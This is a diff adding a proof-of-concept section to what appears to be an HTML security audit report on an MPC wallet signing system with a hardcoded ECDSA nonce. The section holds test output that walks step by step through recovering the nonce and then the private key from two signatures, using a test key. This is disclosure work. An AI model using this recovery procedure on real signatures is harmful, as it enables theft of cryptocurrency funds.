@@ -419,6 +419,174 @@ x = (s·k - z) / r mod n  ← PRIVATE KEY RECOVERED</code></pre>
             └─> k_bytes = [0x42u8; 32]  ← HARDCODED NONCE</code></pre>
                 <p><strong>Every single Bitcoin and Ethereum transaction signed by this system uses the same
                         nonce.</strong></p>
+
+                <h4>Proof of Concept: Private Key Extraction</h4>
+                <pre><code>test tests::test_1_nonce_reuse_attack_extracts_private_key ... 
+
+╔══════════════════════════════════════════════════════════════════╗
+║           TEST 1: PRIVATE KEY EXTRACTION ATTACK                  ║
+║   Proves that 2 signatures are enough to steal the private key   ║
+╚══════════════════════════════════════════════════════════════════╝
+
+[STEP 1] Setting up private key (simulating MPC network's key)
+─────────────────────────────────────────────────────────────────
+    Private Key: 0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01
+    (This key controls all funds in the MPC wallet)
+
+[STEP 2] Creating two different transactions
+─────────────────────────────────────────────────────────────────
+    Transaction 1: "Send 1 BTC to Alice - Transaction #12345"
+    Hash (z1):     0x78a6f06b4c8f65a9d96972bc7c4c4f41594d08ec740d300d533f5bd53311c5f3
+
+    Transaction 2: "Send 0.5 BTC to Bob - Transaction #67890"
+    Hash (z2):     0xe62b261dcbb99054d50d72df1c5b49dd2c9739888dac5a93d018e4f43f6f5486
+
+[STEP 3] Signing transactions with VULNERABLE function
+─────────────────────────────────────────────────────────────────
+    Using hardcoded nonce k = 0x424242...42 (from src/signing/mod.rs:261)
+
+    Signature 1: (r1, s1)
+      r1 = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+      s1 = 0xcd147d25cc4641aeb4fd63f2d904846984950cfbdf040617bf36b08cccae8855
+
+    Signature 2: (r2, s2)
+      r2 = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+      s2 = 0x1e32d076ab19563459eb5a368333ff69136e719399af25efe481611dc89c62a4
+
+[STEP 4] CRITICAL OBSERVATION
+═══════════════════════════════════════════════════════════════════
+    Comparing r values from both signatures...
+
+    ██████████████████████████████████████████████████████████████
+    █                                                            █
+    █   r1 == r2 ?  >>>  TRUE  <<<                               █
+    █                                                            █
+    █   THIS IS THE VULNERABILITY!                               █
+    █   Same 'r' means same nonce 'k' was used!                  █
+    █                                                            █
+    ██████████████████████████████████████████████████████████████
+═══════════════════════════════════════════════════════════════════
+
+[STEP 5] EXECUTING ATTACK - Extracting private key
+─────────────────────────────────────────────────────────────────
+    Using formulas:
+      k = (z1 - z2) / (s1 - s2) mod n
+      private_key = (s1 * k - z1) / r mod n
+
+    ┌─────────────────────────────────────────────────────────────────┐
+    │  INPUT VALUES (all public on blockchain)                        │
+    └─────────────────────────────────────────────────────────────────┘
+    z1 = 0x78a6f06b4c8f65a9d96972bc7c4c4f41594d08ec740d300d533f5bd53311c5f3
+    z2 = 0xe62b261dcbb99054d50d72df1c5b49dd2c9739888dac5a93d018e4f43f6f5486
+    r  = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+    s1 = 0xcd147d25cc4641aeb4fd63f2d904846984950cfbdf040617bf36b08cccae8855
+    s2 = 0x1e32d076ab19563459eb5a368333ff69136e719399af25efe481611dc89c62a4
+    n  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+
+    ┌─────────────────────────────────────────────────────────────────┐
+    │  STEP 5b: RECOVERING NONCE k                                    │
+    │  Formula: k = (z1 - z2) / (s1 - s2) mod n                       │
+    └─────────────────────────────────────────────────────────────────┘
+    Calculating (z1 - z2) mod n:
+      (z1 - z2) = 0x927bca4d80d5d555045bffdd5ff10562e764ac4a95a975b542f8d56dc3d8b2ae
+
+    Calculating (s1 - s2) mod n:
+      (s1 - s2) = 0xaee1acaf212ceb7a5b1209bc55d0850071269b684554e027dab54f6f041225b1
+
+    Calculating (s1 - s2)^(-1) mod n:
+      (s1 - s2)^(-1) = 0xe22b26f9681f11dfe613b36edc49d3276176590b9af752b51d1dab87b6587372
+
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║  k = (z1 - z2) * (s1 - s2)^(-1) mod n                         ║
+    ║                                                               ║
+    ║  RECOVERED NONCE k:                                           ║
+    ║  0x4242424242424242424242424242424242424242424242424242424242424242  ║
+    ║                                                               ║
+    ║  This matches the hardcoded value 0x424242...42!              ║
+    ╚═══════════════════════════════════════════════════════════════╝
+
+    ┌─────────────────────────────────────────────────────────────────┐
+    │  STEP 5c: RECOVERING PRIVATE KEY x                              │
+    │  Formula: x = (s1 * k - z1) / r mod n                           │
+    └─────────────────────────────────────────────────────────────────┘
+    Calculating (s1 * k) mod n:
+      (s1 * k) = 0x5d7d54a3c1b6cb32e4af3ff47e8d0b8646f19ea9d44b568a92d4c8f2f8dc47bc
+
+    Calculating (s1 * k - z1) mod n:
+      (s1 * k - z1) = 0xe4d66438752765890b45cd380240bc43a85372a40f86c6b8ff67cbaa9600c30a
+
+    Calculating r^(-1) mod n:
+      r^(-1) = 0x3cf03c23c417203c454bef615f2a6c7f1fb5a1bdaca25ddace49254371ffd387
+
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║  x = (s1 * k - z1) * r^(-1) mod n                             ║
+    ║                                                               ║
+    ║  RECOVERED PRIVATE KEY x:                                     ║
+    ║  0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01  ║
+    ╚═══════════════════════════════════════════════════════════════╝
+
+[STEP 6] ATTACK RESULT
+═══════════════════════════════════════════════════════════════════
+    Original Private Key:  0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01
+    Recovered Private Key: 0x112233445566778899aabbccddeeff00112233445566778899aabbccddeeff01
+
+    ╔════════════════════════════════════════════════════════════╗
+    ║                                                            ║
+    ║   ███  KEYS MATCH: TRUE  ███                               ║
+    ║                                                            ║
+    ║   ATTACK SUCCESSFUL!                                       ║
+    ║   Private key was extracted from just 2 signatures!        ║
+    ║                                                            ║
+    ║   An attacker can now:                                     ║
+    ║   - Sign any transaction                                   ║
+    ║   - Steal ALL funds from the wallet                        ║
+    ║   - Completely compromise the MPC network                  ║
+    ║                                                            ║
+    ╚════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════
+
+[CONCLUSION]
+─────────────────────────────────────────────────────────────────
+    VULNERABILITY CONFIRMED!
+    The hardcoded nonce in src/signing/mod.rs:261 allows
+    complete private key extraction from just 2 signatures.
+
+
+ok
+test tests::test_2_nonce_is_hardcoded ... 
+
+╔══════════════════════════════════════════════════════════════════╗
+║           TEST 2: NONCE IS HARDCODED (NEVER CHANGES)             ║
+║   Proves that ALL signatures have the same 'r' value             ║
+╚══════════════════════════════════════════════════════════════════╝
+
+[STEP 1] Signing 4 different messages
+─────────────────────────────────────────────────────────────────
+    Message 1: "Transaction 1: Pay Alice"
+      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+    Message 2: "Transaction 2: Pay Bob"
+      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+    Message 3: "Transaction 3: Pay Charlie"
+      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+    Message 4: "Transaction 4: Any other message"
+      r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c
+
+[STEP 2] Comparing all r values
+─────────────────────────────────────────────────────────────────
+    ██████████████████████████████████████████████████████████████
+    █                                                            █
+    █   ALL 4 SIGNATURES HAVE IDENTICAL 'r' VALUE!               █
+    █                                                            █
+    █   r = 0x24653eac434488002cc06bbfb7f10fe18991e35f9fe4302dbea6d2353dc0ab1c   █
+    █                                                            █
+    █   This proves k (nonce) NEVER changes!                     █
+    █                                                            █
+    ██████████████████████████████████████████████████████████████
+
+[CONCLUSION]
+─────────────────────────────────────────────────────────────────
+    The nonce k = 0x424242...42 is hardcoded and NEVER changes.
+    Every signature from this system can be used for the attack.</code></pre>
             </div>
         </div>
 
